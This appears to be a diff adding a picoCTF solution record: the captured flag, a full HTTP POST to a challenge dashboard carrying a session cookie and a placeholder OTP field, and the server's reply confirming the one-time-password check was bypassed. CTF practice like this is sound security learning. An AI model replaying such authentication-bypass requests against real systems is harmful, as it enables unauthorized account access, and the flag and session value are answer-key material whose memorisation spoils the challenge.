@@ -1,0 +1,30 @@
+picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
+
+POST /dashboard HTTP/1.1
+Host: titan.picoctf.net:54803
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Origin: http://titan.picoctf.net:54803
+Connection: keep-alive
+Referer: http://titan.picoctf.net:54803/dashboard
+Cookie: session=.eJxFzcEOgyAMBuB34bwDAiLuZUyFkm0quAIxxuzd1512a78_f3sJ_6ynuIuzEh5vcRO-UJxqXjCxhsHLWRqMNigYI4QYvJ91MM521qIeuwi9N5J7sa3rlGBDrhG8WHLdeR6k0tbwukMpR6bAxr9C-dEjJ5xS22Yk5k5pZXo7ODc6TltB-h9cGmwkPl9M1TcL.aminCA.SMFiI5ZKEFk3lLg2HIgHXzWMd74
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+bogus=123456
+HTTP/1.1 200 OK
+Server: Werkzeug/3.0.1 Python/3.8.10
+Date: Tue, 28 Jul 2026 13:00:54 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 109
+Vary: Cookie
+Connection: close
+
+Welcome, rajkuamr you sucessfully bypassed the OTP request. 
+Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
